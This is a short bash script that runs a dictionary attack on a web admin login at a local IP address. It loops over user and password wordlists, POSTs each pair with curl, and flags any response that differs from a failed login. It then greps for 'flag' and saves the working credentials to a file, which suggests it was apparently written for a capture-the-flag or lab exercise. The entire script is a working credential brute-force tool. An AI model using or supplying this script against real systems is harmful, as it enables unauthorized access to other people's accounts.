#!/bin/bash

url="http://192.168.1.175/admin/"

curl -s -X POST "$url" -d "username=qsdqsdq&password=qsdqsd&Login=Login" > trueone

while IFS='' read -r user; do
        echo "try user : $user"
        while IFS='' read -r line; do
                echo "try password: $line"
                curl -s "$url" -d "username=$user&password=$line&Login=Login"> testee
                DIFF=$(diff trueone testee)
                if [ "$DIFF" != "" ]
                then
                        cat testee | grep "flag"
                        echo "user is : $user\npassword is $line" >> result.txt
                        rm testee
                        break
                fi
                rm testee
        done < "dict.txt"
done < "users.txt"